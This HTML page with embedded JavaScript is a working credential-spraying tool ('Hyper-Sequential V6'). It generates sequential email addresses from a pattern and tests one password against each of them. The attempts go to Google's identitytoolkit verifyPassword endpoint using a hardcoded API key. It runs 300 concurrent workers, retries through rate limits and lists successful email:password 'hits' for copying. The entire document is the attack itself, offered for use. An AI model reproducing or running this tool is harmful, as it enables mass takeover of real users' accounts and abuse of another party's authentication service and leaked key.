<!DOCTYPE html>
<html>
<head>
    <title>CPM Hyper-Sequential</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
        .bot-frame { max-width: 500px; margin: auto; border: 2px solid #00ff00; background: #050505; padding: 20px; box-shadow: 0 0 30px #00ff00; border-radius: 5px; }
        h1 { font-size: 18px; border-bottom: 1px solid #00ff00; padding-bottom: 10px; color: #fff; text-transform: uppercase; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #00ff00; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; }
        .btn-ignite { width: 100%; padding: 20px; background: #00ff00; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 15px #00ff00; }
        
        .status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .stat-item { background: #111; padding: 15px; border: 1px solid #333; }
        .stat-item b { font-size: 28px; color: #fff; display: block; }

        #log-stream { height: 100px; width: 100%; background: #000; color: #0c0; font-size: 11px; text-align: left; padding: 8px; border: 1px solid #222; overflow: hidden; margin-bottom: 10px; }
        #res-box { width: 100%; height: 250px; background: #000; color: #fff; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
        
        .copy-btn { width: 100%; padding: 12px; background: #111; color: #00ff00; border: 1px solid #00ff00; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="bot-frame">
    <h1>⚡ HYPER-SEQUENTIAL V6</h1>
    
    <input type="text" id="fmt" placeholder="FORMAT: CPM_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-ignite" id="btn" onclick="ignite()">🚀 START TURBO SCAN</button>

    <div class="status-grid">
        <div class="stat-item">CHECKED<b id="c_val">0</b></div>
        <div class="stat-item">FOUND<b id="f_val">0</b></div>
    </div>

    <div id="log-stream">System: Waiting for command...</div>

    <textarea id="res-box" readonly placeholder="Hits: Email:Pass"></textarea>
    
    <button class="copy-btn" onclick="copyResults()">📋 COPY ALL HITS</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let nextToProcess = 0;
    let resultsBuffer = {}; // Buffer to store out-of-order results

    async function ignite() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Enter Data!");

        active = true;
        document.getElementById('btn').innerText = "🛑 TERMINATE ENGINE";
        document.getElementById('btn').style.background = "#f00";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- EXTREME CONCURRENCY (300 Parallel Workers) ---
        // ഒരേസമയം 300 അക്കൗണ്ടുകൾ പമ്പ് ചെയ്യുന്നു.
        let concurrentLimit = 300; 
        let index = 0;

        async function startWorker() {
            while (active && index < max) {
                let currentIdx = index++;
                let numStr = currentIdx.toString().padStart(digits, '0');
                let email = fmt.replace(/\{(\d+)\}/, numStr);
                
                await checkAcc(email, pwd, key, currentIdx, numStr);
            }
        }

        for (let i = 0; i < concurrentLimit; i++) {
            startWorker();
        }
    }

    async function checkAcc(em, pw, k, idx, num) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (r.status === 429) {
                // Rate limited - retry immediately for no-skip
                await new Promise(res => setTimeout(res, 1000));
                return checkAcc(em, pw, k, idx, num);
            }

            let d = await r.json();
            
            // Store result in buffer to maintain strict order
            resultsBuffer[idx] = { found: (d && d.idToken), email: em };
            
            // --- STRICT SEQUENTIAL OUTPUT LOGIC ---
            // ബഫറിൽ അടുത്ത നമ്പർ ഉണ്ടോ എന്ന് നോക്കി ഓർഡറിൽ പ്രിന്റ് ചെയ്യുന്നു
            while (resultsBuffer[nextToProcess]) {
                let data = resultsBuffer[nextToProcess];
                if (data.found) {
                    found++;
                    document.getElementById('f_val').innerText = found;
                    document.getElementById('res-box').value += data.email + ":" + pw + "\n";
                    document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                }
                
                checked++;
                if (checked % 10 === 0) {
                    document.getElementById('c_val').innerText = checked;
                    writeLog(`STRICT: Verified ${data.email}`);
                }
                
                delete resultsBuffer[nextToProcess];
                nextToProcess++;
            }

        } catch (e) {
            return checkAcc(em, pw, k, idx, num); // Retry on network error
        }
    }

    function writeLog(msg) {
        let l = document.getElementById('log-stream');
        l.innerHTML += `> ${msg}<br>`;
        l.scrollTop = l.scrollHeight;
        if (l.innerHTML.length > 1000) l.innerHTML = l.innerHTML.substring(500);
    }

    function copyResults() {
        let t = document.getElementById('res-box');
        t.select();
        document.execCommand('copy');
        alert("Found List Copied!");
    }
</script>

</body>
</html>
